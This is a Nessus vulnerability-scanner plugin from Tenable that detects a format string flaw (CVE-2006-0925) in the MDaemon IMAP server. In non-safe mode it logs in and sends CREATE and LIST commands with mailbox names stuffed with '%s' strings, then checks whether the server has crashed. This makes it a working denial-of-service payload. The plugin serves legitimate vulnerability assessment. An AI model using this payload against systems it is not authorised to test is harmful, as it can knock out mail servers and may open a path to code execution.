#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20987);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-0925");
  script_bugtraq_id(16854);
  script_osvdb_id(23477);

  script_name(english:"MDaemon IMAP Server Mail Folder Name Format String");
  script_summary(english:"Checks for format string vulnerability in MDaemon IMAP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Alt-N MDaemon, an SMTP/IMAP server for the
Windows operating system family. 

The IMAP server component of MDaemon is affected by a format string
vulnerability involving folders with format string specifiers in their
names .  An authenticated attacker can leverage this issue to cause
the remote host to consume excessive CPU resources. 

Further, given the nature of format string vulnerabilities, this issue
is likely to lead to the execution of arbitrary code as LOCAL SYSTEM." );
 script_set_attribute(attribute:"see_also", value:"http://www.nsag.ru/vuln/888.html" );
 script_set_attribute(attribute:"see_also", value:"http://files.altn.com/MDaemon/Release/RelNotes_en.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MDaemon 8.15 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/20");
 script_cvs_date("$Date: 2011/03/11 21:52:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("imap_func.inc");


# Check the imap server.
port = get_service(svc:"imap", default: 143, exit_on_fail: 1);
if (get_kb_item("imap/"+port+"/false_imap")
 || get_kb_item("imap/"+port+"/overflow")) exit(1);


# Make sure it's MDaemon.
banner = get_imap_banner(port:port);
if (!banner || " MDaemon " >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  if (egrep(pattern:"IMAP4.* MDaemon ([0-7]\..*|8\.(0.*|1\.[0-4])) ready", string:banner)) {
    report = string(
      "Nessus has determined the flaw exists with the application\n",
      "based only on the version in the IMAP server's banner.\n"
    );
    security_warning(port:port, extra:report);
  }
}
# Otherwise...
else {
  user = get_kb_item("imap/login");
  pass = get_kb_item("imap/password");
  if (!user || !pass) exit(0);

  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Try to log in.
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;

    # First, we create a mailbox.
    mailbox = string(SCRIPT_NAME, "/", unixtime(), "/", crap(data:"%s", length:104));
    c = string("nessus", string(tag), " CREATE ", mailbox);
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }

    # Now try to list it.
    if (resp && resp =~ "OK" && "CREATE completed" >< s) {
      c = string(
        "nessus", string(tag), 
        ' LIST "', 
        mailbox, '" "', 
        crap(data:"%s", length:100), '"'
      );
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
      }

      # Check whether the server's down now.
      #
      # nb: the server may or may not have returned a response in s.
      soc2 = open_sock_tcp(port);
      if (soc2) s2 = recv_line(socket:soc2, length:1024);

      if (!soc2 || !strlen(s2)) {
        security_warning(port);
        exit(0);
      }

      if (soc2) close(soc2);
    }
  }
  else if (resp =~ "BAD" || resp =~ "NO") {
    debug_print("couldn't login with supplied imap credentials!", level:1);
  }

  # Logout.
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGOUT");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }
  close(soc);
}
